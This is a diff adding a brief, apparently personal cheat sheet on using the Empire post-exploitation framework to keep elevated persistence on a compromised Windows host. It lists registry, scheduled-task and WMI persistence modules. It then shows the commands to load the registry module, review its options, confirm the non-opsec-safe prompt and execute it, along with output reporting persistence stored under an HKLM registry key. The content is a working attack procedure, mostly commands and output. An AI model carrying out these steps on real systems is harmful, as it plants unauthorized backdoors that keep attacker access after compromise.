@@ -1,0 +1,44 @@
+Empire - Priviledge Persistance
+
++ recan reinforce our presence with additional persistence techniques
+
++ once elevated priviledges obtained on target machine, these module can be use for priviledges presistence
+
+	# (Empire: agents) > usemodule powershell/persistence/elevated/registry*
+	# (Empire: agents) > usemodule powershell/persistence/elevated/schtasks*
+	# (Empire: agents) > usemodule powershell/persistence/elevated/wmi*
+	# (Empire: agents) > usemodule powershell/persistence/elevated/wmi_updater*
+
++ use module, check the info, set the listener and execute the module
+
+	# (Empire: Baseline) > usemodule persistence/elevated/registry*
+	# (Empire: powershell/persistence/elevated/registry) > info
+	
+	Options:
+
+	  Name       Required    Value                     Description
+	  ----       --------    -------                   -----------
+	  Listener   False       http                      Listener to use.                        
+	  ProxyCreds False       default                   Proxy credentials                       
+													   ([domain\]username:password) to use for 
+													   request (default, none, or other).      
+	  KeyName    True        Updater                   Key name for the run trigger.           
+	  RegPath    False       HKLM:SOFTWARE\Microsoft\  Registry location to store the script   
+							 Windows\CurrentVersion\D  code. Last element is the key name.     
+							 ebug                    
+	  Proxy      False       default                   Proxy to use for request (default, none,
+													   or other).                              
+	  ExtFile    False                                 Use an external file for the payload    
+													   instead of a stager.                    
+	  UserAgent  False       default                   User-agent string to use for the staging
+													   request (default, none, or other).      
+	  Cleanup    False                                 Switch. Cleanup the trigger and any     
+													   script from specified location.         
+	  ADSPath    False                                 Alternate-data-stream location to store 
+													   the script code.                        
+	  Agent      True        Baseline                  Agent to run module on.                 
+
+	# (Empire: powershell/persistence/elevated/registry) > execute
+	# [>] Module is not opsec safe, run? [y/N] y
+	# (Empire: powershell/persistence/elevated/registry) > 
+	# Registry persistence established using listener http stored in HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug.
